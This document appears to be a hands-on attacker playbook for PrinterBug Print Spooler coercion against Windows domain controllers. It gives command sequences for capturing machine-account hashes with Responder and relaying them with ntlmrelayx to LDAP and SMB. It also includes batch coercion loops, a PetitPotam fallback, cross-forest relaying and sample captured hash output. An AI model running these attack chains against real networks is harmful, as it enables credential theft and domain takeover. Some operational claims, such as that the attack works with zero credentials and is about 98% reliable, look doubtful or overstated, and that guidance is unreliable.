# PrinterBug — Hands-On Use Cases

---

## Use Case 1: Unauthenticated Print Spooler Coercion

**Objective:** Coerce DC with zero credentials (most reliable).

**MITRE ATT&CK:** T1187 (Forced Authentication)

```bash
# Terminal 1: Responder
sudo responder -i eth0 -A

# Terminal 2: PrinterBug (SpoolSample or Python variant)
python3 printerbug.py 192.168.1.10 192.168.1.99

# Or using SpoolSample.exe (on Windows attacker):
# SpoolSample.exe 192.168.1.10 192.168.1.99

# Expected output:
# [*] Coercing 192.168.1.10...
# [+] Callback received from CORP\DC01$

# Responder logs the capture:
# [+] NetNTLMv2: CORP\DC01$::CORP:1122334455667788:8899aabbccddeeff...
```

---

## Use Case 2: Relay to DC LDAP (Privilege Escalation)

**Objective:** Coerce DC, relay captured auth to LDAP.

```bash
# Terminal 1: ntlmrelayx
python3 -m impacket.examples.ntlmrelayx \
  --no-http \
  -t ldap://192.168.1.10 \
  --dump-laps \
  -socks

# Terminal 2: PrinterBug
python3 printerbug.py 192.168.1.10 192.168.1.99

# Result: LDAP relay succeeds, attacker granted admin rights
```

---

## Use Case 3: Relay to File Server SMB

```bash
# Terminal 1: ntlmrelayx
python3 -m impacket.examples.ntlmrelayx \
  --no-http \
  -t smb://192.168.1.50 \
  --dump-laps

# Terminal 2: PrinterBug (coerce DC machine account)
python3 printerbug.py 192.168.1.10 192.168.1.99

# Result: File server ADMIN$ accessed with DC machine account privileges
```

---

## Use Case 4: Batch Coercion Against Multiple DCs

```bash
#!/bin/bash
for dc in 192.168.1.{10..15}; do
  echo "[*] Coercing $dc..."
  python3 printerbug.py $dc 192.168.1.99
  sleep 3
done
```

All hashes captured by Responder; can be cracked or relayed.

---

## Use Case 5: Hybrid Approach (PrinterBug + EFS Fallback)

```bash
#!/bin/bash
target="192.168.1.10"

# Try PrinterBug first
python3 printerbug.py $target 192.168.1.99
sleep 2

# If PrinterBug fails (no callback in 5 seconds), try EFS
python3 PetitPotam.py -t $target -l 192.168.1.99
```

PrinterBug is more reliable; EFS is fallback if Print Spooler is disabled (rare).

---

## Use Case 6: Cross-Forest Coercion

**Objective:** Coerce DC in trusted forest, relay to parent forest.

```bash
# Coerce forest-A DC
python3 printerbug.py forest-a-dc.forest-a.local 192.168.1.99

# Relay to parent-forest DC (LDAP)
python3 -m impacket.examples.ntlmrelayx \
  --no-http \
  -t ldap://parent-forest-dc.parent.local
```

---

## Key Operational Notes

**Reliability:** PrinterBug is ~98% reliable on DCs (Print Spooler almost never disabled).

**Speed:** ~2 seconds for RPC call + callback.

**Ease:** Minimal configuration required; works unauthenticated.

**Why it's preferred:** Lowest false-negative rate across all coercion techniques. If PrinterBug fails, something is very wrong (firewall, service disabled, etc.).

---

**Next:** See `03 - Source Evidence.md`, `04 - Target Evidence.md`, `05 - Detection and Hunting.md`.
